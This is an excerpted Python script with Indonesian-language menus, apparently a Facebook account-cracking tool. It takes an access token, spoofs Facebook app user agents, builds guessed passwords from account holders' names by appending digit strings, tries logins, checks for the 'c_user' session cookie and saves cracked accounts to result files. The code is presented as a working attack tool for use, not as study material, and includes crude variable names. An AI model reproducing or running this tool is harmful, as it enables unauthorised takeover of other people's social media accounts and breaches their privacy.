...
ua_nokia   = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
...
def menu_log():
    ...
    if pmu in ['']:
        ...
        defaultua()
        token = input('%s╚══[%s?%s] %sToken : '%(O,K,O,H))
        try:
        ...
        try:
            ...
            "user-agent"                : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109", # Jangan Di Ganti Ya Anjink
...
def menu():
    ...
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sID : %s'%(O,K,O,P,i))
    print('%s╠══[%s•%s] %sIP : %s'%(O,K,O,P,ip))
    #print('%s║'%(O))
    ...
    print('%s╠══[%s5%s] %sMengambil Jumlah Teman %s'%(O,K,O,H,pro))
    print('%s╠══[%s6%s] %sCek Hasil Crack'%(O,K,O,H))
...
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s╠══[%s1%s] %sXiaomi'%(O,K,O,H))
    print('%s╠══[%s2%s] %sNokia'%(O,K,O,H))
    print('%s╠══[%s3%s] %sAsus'%(O,K,O,H))
    print('%s╠══[%s4%s] %sHuawei'%(O,K,O,H))
    print('%s╠══[%s5%s] %sVivo'%(O,K,O,H))
    print('%s╠══[%s6%s] %sOppo'%(O,K,O,H))
    print('%s╠══[%s7%s] %sSamsung'%(O,K,O,H))
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _dapunta_.append(i+"234")
                _dapunta_.append(i+"2345")
            elif len(i)>=6:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
...
def hasil():
    clear()
    banner()
    jalan('%s╔══[ %sHasil Crack Anda %s]'%(O,P,O))
    print('%s║'%(O))
...
def log_hasil(user, pasw):
    ...
    if "c_user" in ses.cookies:
        ...
        if(str(len(ngew))=="0"):
            ...
            print("%s[%s•%s] %sDitemukan %s Opsi "%(O,K,O,K,str(len(ngew))))
        for opt in range(len(ngew)):
...
def cek_hasil():
    ...
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sFile Yang Tersimpan : CP/%s.txt'%(O,P,O,H,tanggal))
    ...
    for memek in buka_baju:
        ...
        titid  = kontol.split("•")
        print("%s[%s•%s] %sMencoba Login : %s"%(O,K,O,P,kontol))
        try:
...
def var_author():
    ...
    mlaku('%s║     • %sMr Risky (Dumai-991)'%(O,H))
...
def var_ugen():
    ...
    print("%s╠══[%s0%s] %sKembali"%(O,K,O,P))
def start_method():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sMetode B-Api'%(O,K,O,H))
...
def started():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sCrack Berjalan...'%(O,K,O,H))
